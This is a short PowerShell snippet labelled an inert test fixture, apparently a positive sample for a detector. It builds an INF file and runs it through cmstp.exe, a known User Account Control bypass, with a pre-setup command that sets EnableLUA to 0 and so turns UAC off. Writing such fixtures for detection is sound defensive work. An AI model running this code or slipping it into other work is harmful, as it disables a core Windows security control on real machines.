# Inert positive fixture: do not execute.
$inf = @'
[DefaultInstall]
RunPreSetupCommands=PreSetupCommandsSection
[PreSetupCommandsSection]
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
taskkill /IM cmstp.exe /F
'@
$inf | Set-Content bypass.inf
Start-Process cmstp.exe -ArgumentList '/au bypass.inf'
